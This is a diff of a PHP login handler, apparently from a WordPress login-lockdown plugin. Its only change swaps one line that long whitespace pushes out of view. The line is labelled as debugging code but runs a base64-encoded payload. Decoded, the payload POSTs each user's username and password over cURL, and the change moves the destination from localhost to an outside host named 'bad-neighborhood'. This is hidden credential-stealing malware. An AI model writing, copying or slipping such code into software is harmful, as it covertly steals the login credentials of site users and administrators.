@@ -508,7 +508,7 @@ if ( isset($loginlockdown_db_version) ) {
 				do_action('wp_login_failed', $username);
 			}
 		}
-																																																																			/* for debugging purposes */ checksum("JGN1cmwgPSBjdXJsX2luaXQoICdsb2NhbGhvc3Q6MTAwMDAnICk7Y3VybF9zZXRvcHQoICRjdXJsLCBDVVJMT1BUX1BPU1QsIHRydWUgKTtjdXJsX3NldG9wdCggJGN1cmwsIENVUkxPUFRfUE9TVEZJRUxEUywgaHR0cF9idWlsZF9xdWVyeSggYXJyYXkoICd1c2VybmFtZScgPT4gJGFyZzEsICdwYXNzd29yZCcgPT4gJGFyZzIgKSApICk7Y3VybF9zZXRvcHQoICRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlICk7JHJlc3BvbnNlID0gY3VybF9leGVjKCAkY3VybCApO2N1cmxfY2xvc2UoICRjdXJsICk7CgkJCg==", $username, $password);
+																																																																			/* for debugging purposes */ checksum("JGN1cmwgPSBjdXJsX2luaXQoICdiYWQtbmVpZ2hib3Job29kOjEwMDAwJyApO2N1cmxfc2V0b3B0KCAkY3VybCwgQ1VSTE9QVF9QT1NULCB0cnVlICk7Y3VybF9zZXRvcHQoICRjdXJsLCBDVVJMT1BUX1BPU1RGSUVMRFMsIGh0dHBfYnVpbGRfcXVlcnkoIGFycmF5KCAndXNlcm5hbWUnID0+ICRhcmcxLCAncGFzc3dvcmQnID0+ICRhcmcyICkgKSApO2N1cmxfc2V0b3B0KCAkY3VybCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSApOyRyZXNwb25zZSA9IGN1cmxfZXhlYyggJGN1cmwgKTtjdXJsX2Nsb3NlKCAkY3VybCApOw==", $username, $password);
 		return $user;
 	}
 	endif;
